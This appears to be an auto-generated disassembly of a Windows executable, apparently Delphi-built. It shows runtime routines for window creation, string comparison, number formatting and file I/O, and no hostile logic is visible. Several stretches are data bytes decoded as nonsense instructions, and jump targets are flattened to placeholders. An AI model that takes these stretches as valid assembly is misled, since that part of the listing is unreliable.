imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
mov esp 0x600405e
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
je r-xdata
add [ ebx + 0x1825ffc0 ] cl
arpl [ esi ] ax
mov eax eax
jmp [ __import_lookup_table_6(kernel32:DeleteCriticalSection) ]
mov eax eax
jmp [ __import_lookup_table_6(kernel32:FormatMessageA) ]
add ecx [ eax ]
pop esi
inc eax
add [ ebx + 0x1c25ffc0 ] cl
bound eax [ esi ]
mov eax eax
jmp [ RegOpenKeyExA@IAT ]
sub_4068bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a54
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402a44
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406914
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a54
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402a44
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_40696c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_406a61
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_406a89
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406a90
retn
sub_406a9c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406ac1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406ac8
retn
sub_406ad4
push esi
inc esi
add al dh
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add cl dh
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add dl dh
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add bl dh
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add ah dh
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add ch dh
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add dh dh
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add bh dh
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add al bh
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add cl bh
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add dl bh
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add bl bh
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add ah bh
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add ch bh
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add dh bh
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add bh bh
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add al ah
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add cl ah
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add dl ah
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add bl ah
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add ah ah
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add ch ah
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add dh ah
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add bh ah
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add al ch
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add cl ch
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add dl ch
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add bl ch
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add ah ch
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add ch ch
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add dh ch
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add bh ch
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add al dl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add cl dl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add dl dl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add bl dl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add ah dl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add ch dl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add dh dl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add bh dl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add al bl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add cl bl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add dl bl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add bl bl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add ah bl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add ch bl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add dh bl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add bh bl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add al al
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add cl al
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add dl al
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add bl al
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add ah al
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add ch al
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add dh al
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add bh al
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add al cl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add cl cl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add dl cl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add bl cl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add ah cl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add ch cl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add dh cl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add bh cl
inc [ eax ]
add [ esi + edx * 2 + 0x46 ] ah
add [ eax + 0x640000ff ] dh
push esi
inc esi
add [ ecx + 0x640000ff ] dh
push esi
inc esi
add [ edx + 0x640000ff ] dh
push esi
inc esi
add [ ebx + 0x640000ff ] dh
push esi
inc esi
add [ edi + edi * 8 + 0x56640000 ] dh
inc esi
add [ ebp + 0x640000ff ] dh
push esi
inc esi
add [ esi + 0x640000ff ] dh
push esi
inc esi
add [ edi + 0x640000ff ] dh
push esi
inc esi
add [ eax + 0x640000ff ] bh
push esi
inc esi
add [ ecx + 0x640000ff ] bh
push esi
inc esi
add [ edx + 0x640000ff ] bh
push esi
inc esi
add [ ebx + 0x640000ff ] bh
push esi
inc esi
add [ edi + edi * 8 + 0x56640000 ] bh
inc esi
add [ ebp + 0x640000ff ] bh
push esi
inc esi
add [ esi + 0x640000ff ] bh
push esi
inc esi
add [ edi + 0x640000ff ] bh
push esi
inc esi
add [ eax + 0x640000ff ] ah
push esi
inc esi
add [ ecx + 0x640000ff ] ah
push esi
inc esi
add [ edx + 0x640000ff ] ah
push esi
inc esi
add [ ebx + 0x640000ff ] ah
push esi
inc esi
add [ edi + edi * 8 + 0x56640000 ] ah
inc esi
add [ ebp + 0x640000ff ] ah
push esi
inc esi
add [ esi + 0x640000ff ] ah
push esi
inc esi
add [ edi + 0x640000ff ] ah
push esi
inc esi
add [ eax + 0x640000ff ] ch
push esi
inc esi
add [ ecx + 0x640000ff ] ch
push esi
inc esi
add [ edx + 0x550000ff ] ch
mov ebp esp
xor eax eax
push ebp
push sub_406dd1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406dd8
retn
sub_4078d0
mov cl 0x78
inc eax
add [ ebx - 0x3affbf88 ] bh
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx - 0x66ffbf88 ] dl
js r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx - 0x56ffbf88 ] ah
js r-xdata
lodsb [ esi ]
push edx
popad
inc ebp
js r-xdata
add [ eax + 0x79 ] bl
inc eax
add [ eax ] dh
add [ eax ] al
add [ ecx + edx + 0x34540040 ] dl
inc eax
add [ eax ] bl
push esi
inc eax
add [ esi + edx * 2 ] ah
inc eax
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ esi + edx * 2 ] dh
inc eax
add [ ecx ] al
add [ eax ] al
add [ edx - 0x74 ] dl
adc [ ebx - 0x71 ] bh
sbb eax 0xdf9c4cdb
push edi
loopne r-xdata
insb
jne r-xdata
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x4078d03f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
jns r-xdata
retn
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
adc [ ecx + 0x46313415 ] cl
add [ ebx + 0x463eac15 ] cl
add [ ebx + 0xa890448 ] cl
outsb
imul edi [ edx + 0x65 ] r-xdata
add al bl
xor [ eax ] eax
test dl cl
inc eax
add [ esp + edx * 2 ] ah
add ah ch
js r-xdata
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026dc
call ebx
pop ebx
retn
xor al 0x31
inc esi
add [ ebx + 0x34158910 ] cl
xor [ esi ] eax
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
arpl [ eax + 0x72 ] bp
outsd
dec ebp
jne r-xdata
add [ edx + ecx * 8 + 0x54240040 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_407980
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_40799c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e8
call sub_403998
pop edi
pop esi
pop ebx
retn
sub_4079c0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4026bc
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402c40
mov eax esi
pop esi
pop ebx
retn
sub_4079e0
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026dc
call ebx
pop ebx
retn
sub_407a0c
push ebx
mov ebx eax
mov eax 0xc
call sub_4026bc
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_4079e0
pop ebx
retn
sub_407a44
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_40421c
mov ebx eax
mov eax edi
mov edx ebx
call sub_4045a8
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_407a80
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_40421c
mov ebx eax
mov eax edi
mov edx ebx
call sub_4045a8
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407abc
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_407aec
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_407b0c
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_407b60
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_407b0c
test eax eax
jne r-xdata
sub_407b84
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40421c
push eax
mov eax esi
call sub_40441c
push eax
mov eax ebx
call sub_40421c
push eax
mov eax ebx
call sub_40441c
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407bbc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40421c
push eax
mov eax esi
call sub_40441c
push eax
mov eax ebx
call sub_40421c
push eax
mov eax ebx
call sub_40441c
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407c0c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_407c2c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_40421c
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_403f5c
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_40447c
pop ebp
pop edi
pop esi
pop ebx
retn
sub_407c7c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1 ] dl
mov edi eax
xor eax eax
push ebp
push sub_407dd5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx edi
mov eax edi
call sub_40421c
mov esi eax
add esi ebx
mov eax edi
call sub_40421c
mov [ ebp - 0xc ] eax
cmp esi ebx
jbe r-xdata
lea eax [ ebp - 0x14 ]
mov edx ebx
call sub_404154
mov eax [ ebp - 0x14 ]
call sub_40421c
cmp eax [ ebp - 0xc ]
jne r-xdata
mov al [ ebx ]
mov edx eax
sub dl 0xa
je r-xdata
mov ebx edi
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
xor edx edx
call sub_40404c
mov edi [ ebp - 0x8 ]
mov edi [ edi ]
cmp esi ebx
jbe r-xdata
mov eax [ ebp - 0x8 ]
mov edx edi
call sub_403fb0
jmp r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
sub dl 0x3
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_407ddc
lea eax [ ebp - 0x14 ]
call sub_403f5c
retn
mov al [ ebx ]
mov edx eax
sub dl 0xa
je r-xdata
inc ebx
inc [ ebp - 0xc ]
jmp r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
sub dl 0x3
je r-xdata
cmp [ ebx + 0x1 ] 0xa
jne r-xdata
cmp [ ebx + 0x1 ] 0xa
jne r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov [ edi ] 0xa
inc edi
inc ebx
jmp r-xdata
mov [ edi ] 0xd
inc edi
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
jmp r-xdata
dec [ ebp - 0xc ]
jmp r-xdata
inc [ ebp - 0xc ]
jmp r-xdata
inc ebx
jmp r-xdata
mov eax ebx
call sub_40bfd4
mov ebx eax
jmp r-xdata
cmp esi ebx
ja r-xdata
mov [ edi ] 0xa
inc edi
inc ebx
cmp [ ebx ] 0xa
jne r-xdata
mov [ edi ] 0xd
inc edi
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
cmp esi ebx
ja r-xdata
inc ebx
jmp r-xdata
mov al [ ebx ]
mov [ edi ] al
inc edi
inc ebx
mov eax ebx
call sub_40bfb4
mov [ ebp - 0x10 ] eax
mov edx edi
mov eax ebx
mov ecx [ ebp - 0x10 ]
call sub_4028b8
add edi [ ebp - 0x10 ]
add ebx [ ebp - 0x10 ]
jmp r-xdata
sub_407de4
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_40421c
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_40421c
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_407e48
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_407e5e
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_407e5e
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407e5e
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407e94
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_407e48
mov edx esi
pop eax
call sub_40404c
add esp 0x10
pop esi
retn
sub_407eb4
or cl cl
jne sub_407ee8
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_407ee8
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_407ee8
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_407ee8
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_407f80
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_407eb4
mov edx esi
pop eax
call sub_40404c
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_407fa8
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_407e48
mov edx esi
pop eax
call sub_40404c
add esp 0x20
pop esi
retn
xor edx edx
sub_407fd0
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402c60
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_40799c
sub_408024
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402c60
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_408044
mov eax [ rw-data ]
call sub_404d24
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_404d24
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404ee0
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403fb0
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404ee0
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403fb0
sub_4080d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_407bf4
test al al
je r-xdata
sub_408110
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4092fc
mov edx eax
test dl dl
je r-xdata
call sub_408044
push ebp
mov eax [ rw-data ]
call sub_404d2c
mov edx eax
mov eax [ rw-data ]
call sub_4080d4
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_404d2c
mov edx eax
mov eax [ rw-data ]
call sub_4080d4
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_4081ac
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403fb0
call sub_408044
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403fb0
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403fb0
jmp r-xdata
pop esi
pop ebx
retn
sub_4081f8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_40441c
push eax
call CreateFileA
sub_408250
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_40441c
push eax
call CreateFileA
pop ebx
retn
sub_40827c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4082a8
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4082d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_408314
push ebx
push esi
mov esi eax
mov eax esi
call sub_40421c
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40bda4
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_408344
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_40421c
mov edi eax
mov eax ebx
call sub_40441c
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
